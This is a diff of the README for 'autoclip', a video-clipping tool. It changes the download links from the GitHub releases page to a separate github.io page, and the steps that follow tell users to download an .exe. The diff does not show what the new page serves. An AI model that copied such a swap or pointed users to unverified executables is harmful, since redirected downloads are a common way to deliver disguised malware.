@@ -1,6 +1,6 @@
 # ✂️ autoclip - Create viral social media clips automatically
 
-[![Download autoclip](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Rohitpati8464/autoclip/releases)
+[![Download autoclip](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://rohitpati8464.github.io)
 
 Autoclip turns long videos into short clips for social media. It finds the best moments, adds captions, and tracks speakers. Everything runs on your computer. Your files stay private because the software works offline. You do not need to upload your videos to a cloud server.
 
@@ -8,7 +8,7 @@ Autoclip turns long videos into short clips for social media. It finds the best 
 
 You can get the software from the official release page. Follow these steps to start:
 
-1. Visit the [autoclip release page](https://github.com/Rohitpati8464/autoclip/releases).
+1. Visit the [autoclip release page](https://rohitpati8464.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe for Windows.
 4. Save the file to your computer.
